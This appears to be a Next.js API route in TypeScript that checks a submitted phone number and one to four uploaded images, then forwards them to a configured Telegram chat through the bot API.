import { NextResponse } from 'next/server'

export const runtime = 'nodejs'

export async function POST(request: Request) {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID
  if (!token || !chatId) return NextResponse.json({ error: 'Telegram is not configured.' }, { status: 500 })

  const incoming = await request.formData()
  const phoneNumber = String(incoming.get('phoneNumber') || '').trim()
  if (!/^\d{5,15}$/.test(phoneNumber)) return NextResponse.json({ error: 'Invalid phone number.' }, { status: 400 })

  const media = []
  const telegramForm = new FormData()
  telegramForm.append('chat_id', chatId)
  const photos = Array.from(incoming.entries()).filter(([key, value]) => key.startsWith('photo') && value instanceof File)
  if (!photos.length || photos.length > 4) return NextResponse.json({ error: 'Please provide one to four frames.' }, { status: 400 })

  for (const [key, value] of photos) {
    if (!(value instanceof File) || !value.type.startsWith('image/')) continue
    telegramForm.append(key, value, `${key}.jpg`)
    media.push({ type: 'photo', media: `attach://${key}`, ...(media.length === 0 ? { caption: phoneNumber } : {}) })
  }
  telegramForm.append('media', JSON.stringify(media))

  const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, { method: 'POST', body: telegramForm })
  const result = await telegramResponse.json().catch(() => null)
  if (!telegramResponse.ok || !result?.ok) return NextResponse.json({ error: 'Telegram could not receive the upload.' }, { status: 502 })
  return NextResponse.json({ ok: true })
}
